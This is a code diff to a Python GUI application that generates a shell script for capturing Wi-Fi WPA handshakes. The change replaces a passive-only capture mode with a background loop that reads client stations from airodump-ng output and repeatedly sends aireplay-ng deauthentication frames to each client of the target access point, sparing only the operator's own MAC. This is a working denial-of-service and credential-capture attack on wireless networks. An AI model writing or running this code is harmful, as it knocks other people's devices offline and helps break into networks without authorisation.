@@ -1150,13 +1150,34 @@ class MaximWindow(QMainWindow):
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n\n")
 
-        # No deauth — passive capture only. Handshake happens when any client
-        # reconnects naturally. Zero disruption to any network.
-        script.write("echo '  Passive mode — waiting for a client to reconnect...'\n")
-        script.write("echo '  (No deauth — your connections stay alive)'\necho\n\n")
+        # Get wlan0 MAC to exclude from deauth
+        script.write("MY_MAC=$(cat /sys/class/net/wlan0/address 2>/dev/null | tr '[:upper:]' '[:lower:]')\n")
+        script.write("echo \"  Your wlan0 MAC: $MY_MAC (protected)\"\necho\n\n")
 
-        # Foreground: capture on the target channel+BSSID
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n\n")
+        # Background: find clients on target AP, deauth only those != wlan0 MAC
+        # Uses targeted -c CLIENT deauth, never broadcast
+        script.write("(\n")
+        script.write("  sleep 8\n")  # let airodump collect some stations first
+        script.write("  while true; do\n")
+        # Read stations from the airodump CSV that's being written by the foreground process
+        script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
+        script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
+        script.write("      grep -E '^[0-9A-Fa-f]{2}:' \"$CAP_CSV\" | grep -v \"$BSSID\" | while IFS=, read -r STA REST; do\n")
+        script.write("        STA=$(echo \"$STA\" | tr -d ' ' | tr '[:upper:]' '[:lower:]')\n")
+        script.write("        if [ -n \"$MY_MAC\" ] && [ \"$STA\" = \"$MY_MAC\" ]; then continue; fi\n")
+        script.write("        if [ -n \"$STA\" ]; then\n")
+        script.write(f"          sudo aireplay-ng --deauth 3 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
+        script.write("        fi\n")
+        script.write("      done\n")
+        script.write("    fi\n")
+        script.write("    sleep 10\n")
+        script.write("  done\n")
+        script.write(") &\n")
+        script.write("DEAUTH_PID=$!\n\n")
+
+        # Foreground: capture on the target channel+BSSID (also writes CSV with stations)
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
+        script.write("kill $DEAUTH_PID 2>/dev/null\n")
 
         # If user closes terminal manually
         script.write(f"echo 'DONE' > '{signal_file}'\n")
